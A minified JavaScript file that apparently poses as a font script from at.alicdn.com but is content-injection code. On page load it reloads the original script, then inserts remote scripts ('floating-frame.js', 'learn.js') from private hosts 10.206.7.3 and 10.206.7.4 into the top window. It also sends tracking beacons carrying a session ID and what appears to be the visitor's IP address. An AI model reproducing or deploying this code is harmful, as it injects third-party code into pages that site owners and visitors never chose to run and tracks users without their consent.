! function() {
    function sendAccounting(e, n) { e = e || 1;
        n = n || 0; var t = new Image;
        11 == n || w && 6 == n || (t.src = "http://10.206.7.4:80/" + e + "-1/e14fcf73-5418-464b-90bf-1a70e3e35e49_101.247.217.98/" + n + "." + (m + j));
        (2 == e || g) && I.d(); return t }

    function e(e) { return w ? "http://10.206.7.4:80/Check/2/1/e14fcf73-5418-464b-90bf-1a70e3e35e49/101.247.217.98/qpaswn" : 1 == e && "http://10.206.7.4/CheckUrl/1/1" }

    function n(n) { var i, r, o = Math.floor(1e3 * j),
            c = "fp",
            u = c + o,
            s = { h: "acfccd6a5167acd3fd092c20f72ec19d2283d802" },
            a = "_!$[]fpe14fcf73-5418-464b-90bf-1a70e3e35e49[]$!_";
        I = { d: function() { C[a] === s && (C[a] = 0) }, s: function(e) { C[a].c = e } }; if (w && T - w > 54e5) return 11; "string" == typeof n.jsURI && (n.jsURI = [n.jsURI]); if ((i = C[a]) && i.h === s.h && !i.c) return 1;
        r = i && i.c;
        C[a] = s; if (n.requireTopWindow && C != top) return 2; if (n.requireObjectHasOwnProperty && !Object.prototype.hasOwnProperty) return 3; if (n.json) { if ("string" == typeof n.json) try { n.json = U.eval("(" + n.json + ")") } catch (e) { return 4 }
            n.json.minimum_width = n.minWidth = n.json.minimum_width || n.minWidth;
            n.json.minimum_height = n.minHeight = n.json.minimum_height || n.minHeight;
            n.json._accounting = { stopTime: h, sendAccounting: sendAccounting, allowNext: I, uri: "http://10.206.7.3/static", comm: "http://10.206.7.4/", fpsessionid: "e14fcf73-5418-464b-90bf-1a70e3e35e49", check: e("%TOPURLMATCH%"), direct: !1, prev: r } } if (!(n.json && "" === n.json.sprite_img || t(C, M, n.minHeight, n.minWidth))) return 5; if (n.json2uri) { for (; void 0 !== C[u];) u = c + ++o;
            C[u] = n.json; for (i = 0; i < n.jsURI.length; i++) n.jsURI[i] += (n.jsURI[i].indexOf("?") !== -1 ? "&" : "?") + u } }

    function t(e, n, t, i) { var r = n.documentElement || n.body || {},
            o = e.innerWidth || r.clientWidth || 0,
            c = e.innerHeight || r.clientHeight || 0; return o >= t && c >= i || !(o + c) }

    function i() { var e, t, i, r, u, s, l = (new Date).getTime(),
            f = { requireTopWindow: !0, requireObjectHasOwnProperty: !1, minWidth: 550, minHeight: 400, sendEarlyAccounting: !0 };
        i = function(e, n) { return e === "@" + n ? null : e };
        r = function(e, n) { if (null === i(e, n)) return null;
            e = e.toLowerCase(); if ("true" == e) return !0; if ("false" == e) return !1;
            e = u(e, n);
            null !== e && (e = !!e); return e };
        u = function(e, n) { if (null === i(e, n)) return null;
            e = parseInt(e); return isNaN(e) ? null : e };
        s = function(e, n) { if (null === i(e, n)) return null;
            e = parseFloat(e); return isNaN(e) ? null : e };
        f.jsURI = "http://10.206.7.3/static/FloatingContent/F0y7RdnhqmcHSfx8AqX9uQ/floating-frame.js";
        f.requireTopWindow = r("true", "RequireTopWindow");
        f.minHeight = u("1", "MinimumHeight");
        f.minWidth = u("1", "MinimumWidth");
        f.jsURI = i(c("http://10.206.7.4/static/Device/learn.js?FPSESSIONID=e14fcf73-5418-464b-90bf-1a70e3e35e49&COMMIP=10.206.7.4&OPERATORWEBSITELOGIC=OR&GROUPS=1"), "ContentURL");
        g = r("1", "AllowReplace"); if (f.requireTopWindow) try { o(top.document, "a");
            C = top;
            M = C.document } catch (e) {}
        if ((e = n(f)) || l > h) sendAccounting(2, e);
        else { f.sendEarlyAccounting && sendAccounting(1); if (f.jsURI) { p = a(M); for (e = 0; e < f.jsURI.length; e++) { t = o(M, "script", null, "src", c(f.jsURI[e]), "type", R);
                    t[j] = f.json;
                    p.appendChild(t) } } if (f.onInsert) try { f.onInsert() } catch (e) {} } }

    function r(e) { var n, t, i = [function() { return new XMLHttpRequest }, function() { return new ActiveXObject("Msxml2.XMLHTTP") }, function() { return new ActiveXObject("Microsoft.XMLHTTP") }, U.createRequest]; for (t = 0; t < i.length; t++) { n = 0; try { n = i[t](); break } catch (e) { n = 0 } } if (n) try { n.open("GET", e, !1);
            n.setRequestHeader("X-PLCS", "xhr");
            n.send(null); if (200 == n.status) return n.responseText || " " } catch (e) {} }

    function o(e, n, t) { var i, r = e.createElement(n);
        t && r.appendChild(e.createTextNode(t)); for (i = 3; i < arguments.length; i += 2) r.setAttribute(arguments[i], arguments[i + 1]); return r }

    function c(e) { return e.replace("$PAGEURL$", escape(s(C).href)) }

    function u() { U.V = u.V;
        u.oncomplete && u.oncomplete() }

    function s(e) { return e.location || e.document.location || {} }

    function a(e, n, t) { n = e.getElementsByTagName("script"); return ((t = n.length) ? n[t - 1] : m = 4).parentNode || e.body || e.documentElement.firstChild } try { var l, f, h, p, m, d, I, g, R = "text/javascript",
            j = Math.random(),
            T = (new Date).getTime(),
            w = parseInt("qpaswn", 36),
            E = parseFloat("45"),
            U = window,
            y = document,
            C = U,
            M = y;
        f = "http://" + unescape("at.alicdn.com%2Ft%2Ffont_2390654_0zg9iiqwdaz.js");
        p = y.createElement("div");
        m = 3;
        p.innerHTML = "<!--[if IE]><i></i><![endif]-->";
        d = p.getElementsByTagName("i").length;
        u.V = U.V;
        U.V = u;
        isNaN(E) && (E = 15);
        h = T + 1e3 * E - 2;
        w = isFinite(w) ? 1e3 * w : 0;
        h = T + 1e3 * E - 2;
        w = isFinite(w) ? 1e3 * w : 0;
        f += (~f.indexOf("?") ? ~f.indexOf(";") ? ";" : "&" : "?") + "_fp" + (1e3 * j | 0) + "=" + j; if (f.split("/")[2] == s(U).host) { l = r(f); if (l) { m = 1;
                u.js = l;
                u.oncomplete = i; return } } if (y.readyState == (d ? "interactive" : "loading")) { m = 2;
            y.write("<scr".concat('ipt src="') + f + '" type="' + R + '"></scr'.concat("ipt>")) } else { p = a(y);
            p.appendChild(o(y, "script", 0, "src", f, "type", R, "async", !1)) }
        i() } catch (e) {} }();
if (window.V) { if (V.js) try { window.eval(V.js) } catch (e) {}
    V() }